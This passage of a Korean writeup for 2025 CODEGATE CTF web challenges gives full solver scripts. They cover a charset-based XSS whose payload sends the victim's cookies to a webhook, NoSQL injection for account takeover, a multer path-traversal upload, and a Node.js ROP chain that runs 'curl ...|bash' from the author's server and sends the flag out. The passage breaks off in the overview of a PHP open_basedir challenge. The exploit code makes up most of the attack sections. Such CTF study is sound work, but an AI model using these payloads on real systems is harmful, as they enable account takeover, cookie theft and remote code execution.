`Jsoup.clean` 필터링을 거친 content값은 `buildDomPurifyWrapper`함수에 들어가 `escapeJsStringLiteral`함수를 거치고 raw값으로 지정된다.

![[MailController.java](http://MailController.java), buildDompurifyWrapper함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2013.png)

[MailController.java](http://MailController.java), buildDompurifyWrapper함수

Dompurify에서 `<style>`태그와 속성을 허용하고 있지만 최신 버전을 사용하기 때문에 알려진 취약점은 없다.

따라서, Dompurify를 직접적으로 우회하는 대신 다른 트릭을 사용해야 한다.

## Dompurify Bypass

![escapeJsStringLiteral 함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2014.png)

escapeJsStringLiteral 함수

`escapeJsStringLiteral`함수에서 인자로 받은 input값을 큰따옴표(”)로 감싸고 나머지 특수문자들과 `</script>`구문을 이스케이프 시키는걸 볼 수 있다.

만약, 큰따옴표(`”`)를 이스케이프 할 수 있다면 `<script>`구문 안에 다른 악성 스크립트를 주입할 수 있을 것이다. 하지만, 해당 `escapeJsStringLiteral`에서 큰따옴표(”)앞에 백슬래쉬(`\`)를 붙이기 때문에 쉽게 이스케이프 하지 못하는 상황이다. 이때, `parseMessage`함수에서 취약한 부분을 발견할 수 있었다.

`parseMessage`함수에서 contentType의 `charset`을 갖고오고 있는데 해당 `charset`이 UTF-8이 아닌 다른 값이면 Java와 Chrome의 MIME해석 차이를 사용하여 큰따옴표를 우회할 수 있을 것이다.

![parseMessage함수에서 charset을 지정해주고 있는 부분](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2015.png)

parseMessage함수에서 charset을 지정해주고 있는 부분

해당 기법에 대해선 아래 문서에 잘 나와있다.

https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/

크롬같은 브라우저에서 이스케이프 시퀀스를 통해 다른 character set으로 전환할 수 있다. 위 포스트에선 총 4가지를 설명하고 있다.

- \x1b\x28\x42 ⇒ ASCII
- \x1b\x28\x4a ⇒ JIS X 0201 1976
- \x1b\x24\x40 ⇒ JIS X 0208 1978
- \x1b\x24\x42 ⇒ JIS X 0208 1983

이중 특히 `JIS X 0201 1976`은 주로 ASCII와 호환되므로 대부분 동일한 문자가 생성된다.

하지만 코드표를 보면 ASCII코드표와 다른부분이 몇가지 있다.

![JIS X 0201 1976 table](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2016.png)

JIS X 0201 1976 table

특히 ASCII에서 0x5C는 백슬래쉬(`\`) 문자에 해당하는데 JIS X 0201 1976에서는 문자 `¥` 에 매칭된다.

따라서 백슬래쉬 문자가 ¥ 해당 문자로 치환되므로 큰따옴표(`”`)가 이스케이프 되는걸 막을 수 있다.

즉, `\”` 이 `¥"` 로 변환되기에 큰따옴표(`”`)를 그대로 사용할 수 있고 `<script>`태그 구문에 원하는 스크립트를 넣을 수 있다.

위 기법을 적용한 익스플로잇 과정은 다음과 같다.

1. Jsoup.clean에 지워지지 않게 `<style>`태그 구문에 감싸 이스케이프 시퀀스와 큰따옴표(”)와 실행하고 싶은 스크립트 구문을 넣음
2. JIS X 0201 1976으로 인코딩하는 charset을 지정하여 mail서버에 직접 보냄 (mail 서버는 25번 포트로 열려있음)

![mailbox가 25번 포트에 매핑되어있다.](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2017.png)

mailbox가 25번 포트에 매핑되어있다.

1. admin@securemail.com으로 보내 bot이 해당 메일을 읽게하여 쿠키 탈취

위 포스트에선 ISO-2022-JP 인코딩을 중점으로 설명하고 있어서 처음에 ISO-2022-JP로 시도해 봤다.

하지만 자바에서 지원하지 않는건지 최신 크롬 버전에서 막고있는건진 모르겠지만 생각대로 이스케이프 되지 않았다. 그러나 아래 문서에서 다른 `JIS X 0201 1976`를 지원하는 여러 charset을 찾을 수 있었다.

https://docs.oracle.com/javase/jp/6/technotes/guides/intl/encoding.doc.html

![JIS X 0201검색  결과](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2018.png)

JIS X 0201검색 결과

ISO-2022-JP이외에도 JIS_X0201이라는 charset이 존재했다.

따라서, 해당 charset을 메일의 Content-Type에 지정하고 보내면 성공적으로 `\` 가`¥` 으로 치환되고 `alert(1)`을 실행시킬 수 있었다!

![\이 ¥으로 매핑됨](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2019.png)

\이 ¥으로 매핑됨

![JIS_X0201 charset을 사용 시 alert(1)이 성공적으로 트리거됨](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2020.png)

JIS_X0201 charset을 사용 시 alert(1)이 성공적으로 트리거됨

이제 스크립트를 통해 쿠키 값을 내 webhook 사이트로 가지고 오면 최종적으로 챌린지를 해결할 수 있다.

## Solver

최종 PoC는 아래와 같다.

```python
import smtplib
from email.message import EmailMessage
import base64

SMTP_HOST = "127.0.0.1"
SMTP_PORT = 25
USERNAME  = "test@securemail.com"
PASSWORD  = "test123456"

msg = EmailMessage()
msg["Subject"] = "\x1b(Jpayload"
msg["From"]    = USERNAME
msg["To"]      = "admin@securemail.com"
content = """<style>\x1b(J ";location.href='https://webhook.site/c9b79407-0e3d-41ce-a5bd-ccd1ba099ef0/?q='+document.cookie//</style>"""
b64_text = base64.b64encode(content.encode()).decode()
msg.set_payload(b64_text)
msg["Content-Type"]              = 'text/html; charset=JIS_X0201'
msg["Content-Transfer-Encoding"] = 'base64'

with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as s:
    s.ehlo()
    if s.has_extn("STARTTLS"):
        s.starttls()
        s.ehlo()
    s.login(USERNAME, PASSWORD)
    s.send_message(msg)

print("Complete!")
```

![flag획득](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2021.png)

flag획득

JIS_X0201 charset 이외에도 `x-MacRoman`, `x-MacArabic` 등 x-Mac으로 시작하는 charset도 가능했다.

![JIS_X0201이외에 x-Mac으로 시작되는 charset](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2022.png)

JIS_X0201이외에 x-Mac으로 시작되는 charset

## Unintended Solution

해당 챌린지에는 의도되지 않은 정말 쉬운 풀이가 존재했다.

먼저 다시 `escapeJsStringLiteral`함수를 살펴보겠다.

![MailController.java의 escapeJsStringLiteral함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2023.png)

MailController.java의 escapeJsStringLiteral함수

`<script>`구문을 빠져나오는걸 막기 위해 `</>` 를 `<\\/script>` 로 escape하고 있다. 그러나 문자 대소문자를 구분하지 않고 있기 때문에 `</Script>` 와 같은 구문으로 해당 필터링을 우회할 수 있었다.

```html
<style>
  </Script><Script>alert(1);//
</style>
```

해당 구문을 `content`로 넣으면 아래와 같이 새로운 `script` 구문을 열어 `alert`을 실행시킬 수 있다.

![기존 script구문을 닫고 새로운 script구문을 열어 alert(1)이 성공적으로 들어감](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2024.png)

기존 `script` 구문을 닫고 새로운 `script`구문을 열어 `alert(1)` 이 성공적으로 들어감

## 번외 : Jsoup.clean bypass

`parseMessage`함수에서 사용하고 있는 `Jsoup.clean`함수를 우회할 수 있는 방법이 있다.

![[MailboxService.java](http://MailboxService.java), parseMessage함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2012.png)

[MailboxService.java](http://MailboxService.java), parseMessage함수

현재 챌린지에서 사용되고있는 jsoup의 버전은 1.20.1로 해당 버전의 취약점을 검색해보면 1.21.0 이하 버전에서 가능한 XSS 취약점을 발견할 수 있다.

https://intel.aikido.dev/cve/AIKIDO-2025-10401

`style`을 적당히 사용하여 mxss 페이로드를 작성할 수 있었다.

```html
<svg></p><style><a style="</style><img src=1 onerror=alert(1)>">
```

# [WEB] chachadotcom

## TL;DR

웹분야로 출제되었지만 웹과 포너블 분야가 합쳐진 웹너블 챌린지이다.

해당 문제를 풀기 위해선 3가지 취약점을 체이닝 해야한다.node.js챌린지

1. NoSQL Injection
2. Multer LFI
3. NodeJS ROP

특히 NodeJS ROP 기법은 잘 알려지지 않았던 트릭이고 hexacon에 발표되었던 기법이다.

또한 임의 폴더 작성만으로 RCE가 가능한 기법이기에 매우 흥미로웠던 취약점이다.

해당 파트에서 각 취약점에 대해 자세히 살펴보겠다.

## Overview

웹서버 동작과정에 관해 간단하게 설명하자면 로그인/회원가입 기능이 있고 로그인 시에 질문을 달 수 있다. 만약 admin으로 로그인으로 할 경우엔 질문에 답변을 달 수 있다.

![메인페이지](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2025.png)

메인페이지

## ADMIN계정 탈취

첫번째로 우리가 해야할 점은 admin 계정을 탈취하는 것이다. 해당 방향에 대해서는 `controllers/userController.js` 의 `resetPassword` 부분에서 실마리를 찾을 수 있었다.

![controllers/userController.js의 resetPassword함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2026.png)

controllers/userController.js의 resetPassword함수

change가 true일 경우 email에 해당하는 token을 확인하고 password 변경을 시도하고 있다.

이때, token을 확인하는건 `sendResetPassword` 함수에서 처리하고 있는데 `sendResetPassword` 함수에서 token 값을 그대로 받고 있기 때문에 nosql injection이 발생한다.

![sendResetPassword함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2027.png)

sendResetPassword함수

따라서, 해당 함수를 사용하여 guide 이메일의 비밀번호를 바꿀 수 있을 것이다.

그러나 guide 이메일도 app.js에서 확인할 수 있듯이 `REDACTED` 되어 있다.

![app.js의 initMongo함수 부분](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2028.png)

app.js의 initMongo함수 부분

때문에 먼저 guide 이메일을 알아내고 guide 계정의 비밀번호를 변경해야 한다.

guide이메일은 `controllers/userController.js` 의 `createUser`함수 부분에서 알아낼 수 있다.

![controllers/userController.js의 createUser함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2029.png)

controllers/userController.js의 createUser함수

email을 Regex로 파악하여 해당 계정이 존재하면 `User already exists`를 존재하지 않고 username이 존재하는 경우엔 `Username already taken` 을 반환한다.

이를 활용하여 먼저 더미 username 계정을 만든 후 email에 적절한 regex값을 넣어 리턴되는 결과를 확인하여 guide email을 유출할 수 있다.

```python
import requests
import tqdm

# URL = "http://43.203.117.21:3000"
URL = "http://127.0.0.1:3000"

words = "abcdefghijklmnopqrstuvwxyz0123456789"
guide_email= "guide_"
email_prefix = "guide\\_"
for i in tqdm.tqdm(range(11)):
    for s in words:
        # qwer계정을 먼저 만들어야 한다.
        r1 = requests.post(URL+'/api/auth/register', json={'username':'qwer','email':f'{email_prefix}{s}.*@admin\\.com', 'password':'qwer'})
        if "User already exists" in r1.text:
            guide_email+= s
            email_prefix+=s
            break
print(guide_email+"@admin.com")
```

![guide email leak](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2030.png)

guide email leak

이후에 `/api/auth/reset` 부분에서 token을 `$ne`연산자를 통해 우회할 수 있다.

```python
POST /api/auth/reset HTTP/1.1
Host: 0.0.0.0:3000
Content-Length: 96
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://0.0.0.0:3000
Referer: http://0.0.0.0:3000/reset
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: keep-alive

{
		"email":"guide_abcd1234efg@admin.com",
		"change":true,
		"token":{"$ne":"asdf"},
		"password":"hihi"
}
```

이후 guide email과 변경한 password로 guide 계정을 로그인 할 수 있다.

## Multer Module LFI

guide 계정으로 로그인에 성공했다면 답변을 작성하고 수정할 수 있다.

답변에 관한 부분은 `answerRoutes.js` 와 `answerController.js` 에서 확인할 수 있다.

![answerRoutes.js](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2031.png)

answerRoutes.js

POST `/` 요청으로 answer을 작성 가능하고, PUT `/:uuid` 로 image를 업로드할 수 있다.

이때 우리가 봐야할 부분은 PUT 부분이다. `upload.single` 로 이미지 파일을 바로 받아오고 있고 upload는 multer 모듈을 사용하여 처리되고 있다.

![answerRoutes.js의 multer upload](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2032.png)

answerRoutes.js의 multer upload

여기서 filename을 다음과 같은 코드를 사용하여 filename을 `latin1` 인코딩으로 들어왔다고 가정하고 `utf-8`문자열로 재해석 하고 있다.

```jsx
file.originalname = Buffer.name(file.originalname, "latin1").toString("utf-8");
```

원래라면 `../` 구문이 정제되었겠지만 해당 코드로 인해 특수문자를 사용하여 우회할 수 있다.

`丯` 문자는 U+4E2F문자로 위의 잘못된 구문으로 인해 U+002F(/)문자열로 재해석된다.

https://huntr.com/bounties/92a875fe-c5b3-485c-b03f-d3185189e0b1

```python
import requests
from urllib.parse import quote

URL = "http://127.0.0.1:3000/api/answers/ad8f99b0-0c32-4c40-ba30-34af54148a0f"

cookies = {
    "JSESSIONID": "CFEF4335ED24DBD59C8F3693E6BD9FEF",
    "token":      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNjg3ZjhiYzFhM2YzMjZlMjk0Mzc5MTM1Iiwicm9sZSI6Imd1aWRlIn0sImlhdCI6MTc1MzE4OTM3MCwiZXhwIjoxNzUzMjc1NzcwfQ.RYUt6JOK3-AO_NPk2COVeT_jO_uPor1OH6shiiu3L8A"
}

with open("payload.bin", "rb") as f:
    file_content = f.read()

file_name_raw = "/tmp/pwned"
filename = "..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯" + file_name_raw.replace("/", "丯")

filename_rfc5987 = f"UTF-8''{quote(filename)}"
boundary = "----WebKitFormBoundaryWzBpweyhtRcd9i8R"
dash_boundary = f"--{boundary}"

body = bytearray()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="text"\r\n\r\n'
    "asdfasdfasdf\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="rating"\r\n\r\n'
    "5\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    f'Content-Disposition: form-data; name="image"; filename*={filename_rfc5987}\r\n'
    "Content-Type: text/html\r\n\r\n"
).encode()
body += file_content + b"\r\n"
body += (f"{dash_boundary}--\r\n").encode()

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items()),
}

resp = requests.put(URL, data=body, headers=headers, timeout=10)
print(resp.status_code, resp.text)

```

이로써 우리가 원하는 경로에 파일을 작성할 수 있게 되었다! 하지만, 이제부터가 진짜 고민해야할 부분이다. 파일을 작성할 수 있다 해도 다른 코드들에서 RCE공격을 할 포인트를 찾지 못했다.

그러나, node.js 에서 원하는 경로에 파일을 작성할 수 있을때, 특히 `/proc` 내부에 파일을 작성할 수 있을 때 RCE 공격을 진행할 수 있는 기법이 존재한다.

## node.js ROP

바로 `/proc/self/fd/{fdnum}` 부분에 ROP 체인을 수행할 수 있는 악성 코드를 작성하여 RCE 공격을 수행 하는 것이다. 해당 기법은 2024년 HEXACON에서 발표되었으며 아래 레퍼런스에 자세하게 나와있다.

https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/

여기서는 풀이를 위해 해당 취약점에 대해 간략하게만 설명하겠다.

`/proc/<pid>/fd/` 디렉터리는 해당 프로세스가 열고 있는 모든 파일 디스크립터를 심볼릭 링크 형태로 나타낸다. 각 pid항목은 일반 파일, 장치 파일, 익명 파이프, 이벤트 파일 등 다양한 종류가 나올 수 있다.

일반적으로 익명 파이프는 쓰기 권한이 있는 엔드포인트가 어디에 설정되어있는지 알기 어렵기 때문에 외부에서 데이터를 직접 쓰기는 어렵다.

그러나 procfs 를 통해 `/proc/<pid>/fd/<fd 번호>` 를 지정하면 해당 파이프의 쓰기용 파일 디스크립터에 쓰기가 가능하다. 즉 `/proc/<pid>/fd/<fd 번호>` 는 프로세스가 열어둔 파일 디스크립터에 대한 뷰이기 때문에 해당 fd가 쓰기 모드로 열려 있으면 쓰기 권한이 존재한다.

특히, 읽기 전용 마운트에서도 가능하다. docker 컨테이너 같은 곳에서 procfs가 read-only로 마운트되고 있어도 실제 파이프의 처리는 pipefs에서 관리되기 때문에 쓰기가 차단되지 않는다.

이를 통해, 공격자는 익명 파이프에서 읽는 이벤트 핸들러에 데이터를 공급할 수 있게 된다.

node.js 프로세스는 `libuv`라는 라이브러리를 사용하는데 해당 라이브러리는 익명 파이프를 사용해 이벤트 신호를 보내고 처리하므로 공격자는 해당 파이프에 쓰기를 시도하여 악성 페이로드를 주입할 수 있다.

`libuv` 소스코드에는 `uv_signal_event` 핸들러가 존재한다. 해당 이벤트에서는 `uv__signal_msg_t` 구조체 크기만큼 데이터를 읽어 버퍼를 채운다. 해당 구조체는 아래와 같이 정의되어 있다.

```c
typedef struct {
  uv_signal_t* handle;
  int signum;
} uv__signal_msg_t;
```

handle은 `uv_signal_t` 타입이며 실제로는 `libuv`내부의 `uv_signal_s` 구조체를 가리킨다.

```c
struct uv_signal_s {
  UV_HANDLE_FIELDS
  uv_signal_cb signal_cb;
  int signum;
  // [...]
```

여기서 `signal_cb` 멤버변수는 나중에 이벤트 핸들러에서 `msg->signum` 값과 `handle->signum` 값이 일치하는 경우 실제로 호출될 콜백 함수의 주소를 담고 있는 함수 포인터이다.

만약, 공격자가 두 signum 값을 같게 하고 `handle→signal_cb` 에 원하는 주소를 넣어두면 해당 호출문이 공격자가 지정한 코드로 분기하게 된다.

node.js 바이너리의 보호기법을 확인해보면 PIE가 비활성화 되어있는 것을 볼 수 있다.

![node.js 바이너리의 보호기법 ⇒ PIE가 꺼져있는 것을 확인 가능하다.](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2033.png)

node.js 바이너리의 보호기법 ⇒ PIE가 꺼져있는 것을 확인 가능하다.

PIE가 비활성화 되어있기에 코드 영역 주소도 항상 같으므로 공격자는 쉽게 ROP 체인을 작성할 수 있다.

해당 챌린지에서는 23.10.0버전의 node.js를 사용하고 있기 때문에 해당 버전의 node.js 바이너리를 가지고와서 ROPgadget 주소를 찾아주었다.

![Find ROPgadget in node.js v23.10.0 ⇒ ex) pop rax ; ret](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2034.png)

Find ROPgadget in node.js v23.10.0 ⇒ ex) pop rax ; ret

페이로드는 아래의 레퍼런스와 @toasterpwn님께서 공유해주신 PoC코드를 참고하였다. (**thanks to @toasterpwn!**)

https://i0.rs/blog/engineering-a-rop-chain-against-node-js/

https://learnblockchain.cn/article/14186

아래는 ROP 체인을 작성하여 악성 `exploit.bin`파일을 만드는 코드이다.

```python
from pwn import *
import string
import requests
from urllib.parse import quote

def make_rop_chain():

    # All addresses must be valid UTF-8
    PIVOT_GADGET = 0x42b06b
    SIGNUM = 0x1289500  # must be equal to dword after PIVOT_GADGET
    RW_SECTION = 0x0000000006a9d000

    SYSCALL = 0x0000000000f339d8  # syscall
    POP_RAX = 0x0000000000ecb88a  # pop rax; ret
    POP_RDI = 0x00000000012273dd  # pop rdi; ret
    POP_RSI = 0x0000000000f66719  # pop rsi; ret
    POP_RDX = 0x000000000118de62  # pop rdx; ret
    MOV_GADGET = 0x0000000001478938  # mov qword ptr [rdi], rsi ; ret

    context.arch = "amd64"

    def gadget_write_at(addr, qword):
        if isinstance(qword, bytes):
            if len(qword) > 8:
                raise ValueError("qword cannot be larger than 8 bytes")
            qword = qword.ljust(8, b"\x00")
        yield POP_RDI
        yield addr
        yield POP_RSI
        yield qword
        yield MOV_GADGET

    def gadget_create_string(addr, s):
        s = s.encode() + b"\x00"
        for i in range(0, len(s), 8):
            yield from gadget_write_at(addr + i, s[i:i+8])

    if __name__ == "__main__":
        argv = [RW_SECTION+0x100, RW_SECTION+0x200, RW_SECTION+0x300]
        argv_arr = RW_SECTION

        content = flat([
            PIVOT_GADGET,
            SIGNUM,

            # Write execve() arguments
            *gadget_create_string(argv[0], "/bin/sh"),
            *gadget_create_string(argv[1], "-c"),
            # *gadget_create_string(argv[2], f"curl {SHELL_HOST}:{SHELL_PORT}|sh"),
            #*gadget_create_string(argv[2], f"sleep 100"),
            *gadget_create_string(argv[2], f"touch /tmp/pwned"),
            #! Warning: due to limited chain size, the command needs to be pretty short

            # Create argv[] array
            *gadget_write_at(argv_arr, argv[0]),
            *gadget_write_at(argv_arr + 8, argv[1]),
            *gadget_write_at(argv_arr + 16, argv[2]),

            # Run execve syscall
            POP_RAX,
            constants.SYS_execve,
            POP_RDI,
            argv[0],
            POP_RSI,
            argv_arr,
            POP_RDX,
            0,
            SYSCALL,
        ])

        return content

file_content = make_rop_chain()
with open('exploit.bin', 'wb') as f:
    f.write(file_content)
```

주의해야할 점은, exploit에 사용되는 주소가 모두 유효한 `utf-8`이여야 성공적으로 exploit이 가능하다. 해당 버전의 노드에서는 가젯이 모두 유효한 `utf-8`이었기에 따로 검사하는 로직을 추가하지 않았다.

## Solver

위의 익스플로잇 과정을 정리하면 다음과 같다.

1. admin email leak
2. admin password 변경
3. multer취약점을 활용하여 악성 exploit.bin을 `/proc/self/fd/{fd번호}`에 업로드
4. RCE 쉘 획득

아래는 Full Exploit PoC 코드이다.

```python
from pwn import *
import tqdm
import string
import requests
from urllib.parse import quote

def make_rop_chain():
    # All addresses must be valid UTF-8
    PIVOT_GADGET = 0x42b06b
    SIGNUM = 0x1289500  # must be equal to dword after PIVOT_GADGET
    RW_SECTION = 0x0000000006a9d000

    SYSCALL = 0x0000000000f339d8  # syscall
    POP_RAX = 0x0000000000ecb88a  # pop rax; ret
    POP_RDI = 0x00000000012273dd  # pop rdi; ret
    POP_RSI = 0x0000000000f66719  # pop rsi; ret
    POP_RDX = 0x000000000118de62  # pop rdx; ret
    MOV_GADGET = 0x0000000001478938  # mov qword ptr [rdi], rsi ; ret

    context.arch = "amd64"

    def gadget_write_at(addr, qword):
        if isinstance(qword, bytes):
            if len(qword) > 8:
                raise ValueError("qword cannot be larger than 8 bytes")
            qword = qword.ljust(8, b"\x00")
        yield POP_RDI
        yield addr
        yield POP_RSI
        yield qword
        yield MOV_GADGET

    def gadget_create_string(addr, s):
        s = s.encode() + b"\x00"
        for i in range(0, len(s), 8):
            yield from gadget_write_at(addr + i, s[i:i+8])

    if __name__ == "__main__":
        argv = [RW_SECTION+0x100, RW_SECTION+0x200, RW_SECTION+0x300]
        argv_arr = RW_SECTION

        content = flat([
            PIVOT_GADGET,
            SIGNUM,

            # Write execve() arguments
            *gadget_create_string(argv[0], "/bin/sh"),
            *gadget_create_string(argv[1], "-c"),
            # *gadget_create_string(argv[2], f"curl {SHELL_HOST}:{SHELL_PORT}|sh"),
            #*gadget_create_string(argv[2], f"sleep 100"),
            *gadget_create_string(argv[2], f"curl https://predo.run.goorm.site|bash"),
            #! Warning: due to limited chain size, the command needs to be pretty short

            # Create argv[] array
            *gadget_write_at(argv_arr, argv[0]),
            *gadget_write_at(argv_arr + 8, argv[1]),
            *gadget_write_at(argv_arr + 16, argv[2]),

            # Run execve syscall
            POP_RAX,
            constants.SYS_execve,
            POP_RDI,
            argv[0],
            POP_RSI,
            argv_arr,
            POP_RDX,
            0,
            SYSCALL,
        ])

        return content

URL = "http://127.0.0.1:3000"
# URL = "http://43.203.131.177:3000/"

# make qwer credential first
requests.post(URL + '/api/auth/register', json={'username':'qwer', 'email':'qwer@test.com', 'password':'qwer'})

# leak guide email
words = "abcdefghijklmnopqrstuvwxyz0123456789"
guide_email = "guide_"
email_prefix = "guide\\_"
for i in tqdm.tqdm(range(11)):
    for s in words:
        r1 = requests.post(URL+'/api/auth/register', json={'username':'qwer','email':f'{email_prefix}{s}.*@admin\\.com', 'password':'qwer'})
        if "User already exists" in r1.text:
            guide_email += s
            email_prefix+=s
            break
guide_email += "@admin.com"
print(f"guide_email : {guide_email}")

# change guide password
new_password = 'hihi'
requests.post(URL + '/api/auth/reset', json={'email':guide_email, 'change':True, 'token':{'$ne':'asdf'},'password':new_password})

# make question & answer
session = requests.Session()
session.post(URL + '/api/auth/login', json={'email':guide_email, 'password':new_password})
session.post(URL + '/api/questions', json={'text':'test', 'category':'General'})
r1 = session.get(URL + '/api/questions')
data = r1.json()
r2 = session.post(URL + '/api/answers', json={'text':'asdf','questionId':data[0]['_id']})
data = r2.json()
answer_id = data['uuid']
print(answer_id)

# make rop chain
file_content = make_rop_chain()

# write exploit.bin at /proc/self/fd/{fdnum}
file_name_raw = "/proc/self/fd/12"
filename = "..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯" + file_name_raw.replace("/", "丯")

filename_rfc5987 = f"UTF-8''{quote(filename)}"
boundary = "----WebKitFormBoundaryWzBpweyhtRcd9i8R"
dash_boundary = f"--{boundary}"

body = bytearray()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="text"\r\n\r\n'
    "asdfasdfasdf\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="rating"\r\n\r\n'
    "5\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    f'Content-Disposition: form-data; name="image"; filename*={filename_rfc5987}\r\n'
    "Content-Type: text/html\r\n\r\n"
).encode()
body += file_content + b"\r\n"
body += (f"{dash_boundary}--\r\n").encode()

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
}

resp = session.put(URL + f'/api/answers/{answer_id}', data=body, headers=headers)
print(resp.status_code, resp.text)

```

`fd`번호는 내 환경의 경우엔 12번에 가능했다. 그리고 ROP chain에서 chain size가 한정되어 있기 때문에 최소한의 페이로드 길이로 쉘을 실행하도록 구성하였다.

이를 위해 다음 명령어를 사용하였다.

```bash
curl [https://predo.run.goorm.site|bash](https://predo.run.goorm.site%7Cbash)
```

해당 명령어는 내 서버에서 전달되는 응답을 그대로 bash로 실행하게 한다.

또한 내 서버에는 다음과 같은 명령어를 올려두었다.

```bash
curl -k "[https://webhook.site/c9b79407-0e3d-41ce-a5bd-ccd1ba099ef0?q=$(/](https://webhook.site/c9b79407-0e3d-41ce-a5bd-ccd1ba099ef0?q=$(/readflag*)%5C%5C)readflag*|python3 -c 'import sys, urlib.parse; print(urlib.parse.quote(sys.stdin.read()))')"
```

이렇게 하면 대상 서버가 내 서버로 접속하여 `curl` 을 실행하면서, `/readflag*` 의 결과값을 URL encoding한 뒤 그대로 전달하게 된다.

특히, flag에 띄어쓰기가 포함되어 있을 경우 정상적으로 전송되지 않는 문제가 발생할 수 있으므로, Python의 `urllib.parse.quote` 를 활용하여 flag 값을 URL인코딩한 뒤 넘기도록 처리하였다.

![FLAG 획득](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2035.png)

FLAG 획득

# [WEB] gravelbox

## TL;DR

이 챌린지는 PHP의 **open_basedir** 제한을 우회하여 `/flag.txt`를 읽어내는 챌린지이다. PHP 8.4 환경에서 `eval` 함수를 통해 임의 코드 실행이 가능하지만, `open_basedir=/var/www/html:/tmp` 설정으로 인해 허용된 디렉토리 외부의 파일에 접근할 수 없다.

과거에는 curl extension, glob protocol, symlink 등 다양한 우회 기법이 존재했지만 현재는 모두 패치되어 사용할 수 없다. 이 문제는 PHP의 `expand_filepath()` 함수에서 발생하는 TOCTOU(Time-of-Check-Time-of-Use) 취약점을 이용하여 해결할 수 있다.

공격의 핵심은 두 프로세스 간 경쟁 상태를 만드는 것이다. 한 프로세스에서는 `file_get_contents("../../flag.txt")`를 반복 호출하고, 다른 프로세스에서는 디렉토리 `rename` 작업을 반복 수행한다. 이때 경로 해석 시점과 `open_basedir` 검증 시점 사이의 시간차를 악용하여 제한된 디렉토리 외부에 있는 flag 파일에 성공적으로 접근할 수 있다.

## Overview

전형적인 고난도 PHP 챌린지의 특징을 보여주는 **One Line PHP Challenge**이다.

```php
<?php
@$_GET['key'] === (getenv('TEAM_KEY') ?? random_bytes(16)) ? eval(@$_GET['code']) : show_source(__FILE__);
```

`index.php` 파일은 단 2줄의 코드로 구성되어 있으며, 사용자의 입력을 `eval` 함수를 통해 직접 실행 해준다.

`docker-compose.yml`을 살펴보면 flag는 `/flag.txt` 위치에 존재하며 읽기 권한(r)이 부여되어 있다.

